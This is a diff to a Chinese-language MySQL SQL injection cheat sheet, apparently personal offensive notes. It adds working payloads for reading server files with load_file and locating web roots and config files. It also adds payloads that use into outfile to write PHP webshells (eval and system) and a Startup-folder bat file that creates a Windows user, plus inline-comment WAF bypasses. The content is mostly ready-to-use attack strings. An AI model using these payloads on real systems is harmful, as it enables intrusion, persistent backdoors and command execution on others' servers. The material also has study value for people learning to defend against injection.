@@ -451,13 +451,41 @@ sqlmap -u "http://xxx.com/xxx.php" --form
 
 ## 0x0b load_file文件读取
 
+#### 1. load_file注意事项
+
+load_file()函数是来读取文件的函数，只能读取绝对路径的文件。在注入网站使用load_file()时应先找到网站的绝对路径。例如：
+
+- d:/www/xx/index.php
+- /usr/src/apache/htdoc/index.php
+
+注意：
+
+- Windows下的路径符号"\\"错误，"\\\\"正确，"/"正确
+- 输入文件名可以用十六进制，但记得十六进制不需双引号
+
+而网站根路径获取方式有：
+
+- 报错显示
+- 谷歌hacker
+- site:目标网站 warning
+- 遗留文件 phpinfo、info、test php
+- 漏洞爆路径
+- 读取配置文件
+	- /etc/httpd/conf/httpd.conf
+	- user/local/httpd/conf/httpd.conf
+	- c:/windows/system32/inetsrv/metabase.xml  	IIS中间件情况下
+
+#### 2. load_file使用方法
+
 直接load_file导入文件内容
 
 ```
 id=-1' union select 1, load_file('E:\flag.txt'),3 -- -
 ```
 
-想要load_file函数可以使用需要配置一下，在my.ini中添加这句话`secure_file_priv= `：
+#### 3. 需要开启的配置
+
+Windows下的MySQL想要load_file函数可以使用需要配置一下，在my.ini中添加这句话`secure_file_priv= `：
 
 ```ini
 [mysqld]
@@ -482,11 +510,15 @@ innodb_flush_log_at_trx_commit=1
 show global variables\G;
 ```
 
+而如果是Linux下的MySQL，则需要在/etc/my.cnf的[mysqld]下面添加`local-infile=0`选项。
+
 
 
 ## 0x0c outfile写入文件 
 
-首先需要确认数据库开启了写入文件的功能，先在mysql命令行中查询一下general_log是否开启，没有的话输入`set global general_log=on;`设置开启。
+#### 1. 需要开启的配置
+
+首先需要确认数据库开启了写入文件的功能，先在MySQL命令行中查询一下general_log是否开启，没有的话输入`set global general_log=on;`设置开启。
 
 ```mysql
 mysql> show global variables like "general_log";
@@ -508,16 +540,38 @@ mysql> show global variables like "general_log";
 mysql>
 ```
 
-然后才能进行写入到文件中，下面是将内容<?php phpinfo();?>写入到文件E:\\\\1.php。注意windows系统下路径中一定要用双反斜杠。
+然后才能进行写入到文件中，下面是将内容`<?php phpinfo();?>`写入到文件E:\\\\1.php。
+
+注意：
+
+- windows系统下路径中一定要用双反斜杠。
+
+- 写入的文件名不可以用十六进制，必须引号。
 
 ```
 id=-1' union select 1, '<?php phpinfo();?>', 3 into outfile 'E:\\1.php' -- -  
 ```
 
-写入webshell：
+#### 2. 写入webshell
 
 ```
 id=-1' union select 1,'<?php @eval($_POST['x']);?>',3 into outfile 'E:\\1.php' -- -
+```
+
+#### 3. 利用outfile执行系统命令
+
+利用注入漏洞执行系统命令。
+
+- 第一种方法：写成bat文件，需要使用wamp环境搭建，需要系统权限才能执行。
+
+```
+id=-1' union select 1, "net user seven 123 /add",2,3,4,5,6 into outfile 'C:/Users/User/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/xxx.bat' -- -
+```
+
+- 第二种方法：写成php文件，用system函数执行用户输入。
+
+```
+id=1' union select 1,"<pre><body><?php @system($_GET['cc']);?></body></pre>",3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18 into outfile 'C:/xxx/wwwroot/xxx.php' -- -
 ```
 
 
@@ -551,7 +605,7 @@ id=-1 and union select 1,password from users where username=0x61646d696e -- -
 内联注释就是把注释内容当做sql语句执行，通常可以绕过WAF。
 
 ```
-id=-1 and /*! union */ /*! select */ * from [table] where id=1 -- -
+id=-1 and /*! union */ /*! select */ * from [表名] where [条件] -- -
 ```
 
 #### 5. 绕过注释符过滤
@@ -590,28 +644,66 @@ id=-1 and /*! union */ /*! select */ * from [table] where id=1 -- -
 id=1';set @sql=concat('s','elect * from `db`');PREPARE pre FROM @sql;EXECUTE pre; -- -
 ```
 
-注意：表名为数字时用反引号变为字符串，加上保险一点
+注意：保险起见，表名为数字时最好用反引号变为字符串，以防出错。
 
 
 
+## 0x0e MySQL知识点
 
+#### 1. MySQL函数
 
-## 0xff 其他小技巧
+- system_user()  系统用户名
+- user()       用户名
+- current_user()  当前用户名
+- session_user()  连接数据库的用户名
+- database()    数据库名
+- version()     MySQL数据库版本
+- load_file()   转成16进制或者10进制MySQL读取本地文件的函数
+- @@datadir     读取数据库路径
+- @@basedir     MySQL安装路径
+- @@version_compile_os  操作系统
 
-1. 辅助字符帮助查看
-    `select * from information_schema limit 20\G;`
-    limit 20 是限制了只取20条记录，\\G转化成容易看的形式。
+#### 2. MySQL数据库连接
 
-2. **MySQL基础知识
+```php
+<?php
+$host='localhost';  //数据库地址
+$database='sui';         //数据库名称
+$user='root';            //数据库账户
+$pass='';               //数据库密码
+$webml='/0/';           //安装文件夹
+?>
+```
 
-  MySQL中的大小写不敏感，大写与小写一样
+一般CMS网站在这些文件下可能找到：
+- config.php
 
-  MySQL中的十六进制与URL编码与其原来的语句含义一样，可以直接代替
+- db_config.php
 
-  符号和关键字替换and等价于\&\&、or等价于\|\|
+- include/common.inc.php
 
-  内联注释： /\*! 内联注释 \*/
+类似名称中带config的文件都有可能。
 
-  单行注释：--+或--空格 或#
+#### 3. MySQL特性
+- MySQL中的大小写不敏感。
 
-  多行注释：/\* 多行注释内容 \*/
+- MySQL中的十六进制编码或者URL编码的语句，和编码前的语句含义一样，可以直接代替
+
+- 符号和关键字替换and等价于\&\&、or等价于\|\|
+
+- 内联注释： /\*! 内联注释 \*/
+
+- 单行注释：--+或--空格 或#
+
+- 多行注释：/\* 多行注释内容 \*/
+
+#### 4. 辅助字符 \\G
+
+\\G 功能是帮助查看，转成更加人性化的输出方式。
+
+```mysql
+select * from information_schema limit 20\G;`
+```
+
+limit 20 是限制了只取20条记录，\\G转化成容易看的形式。
+
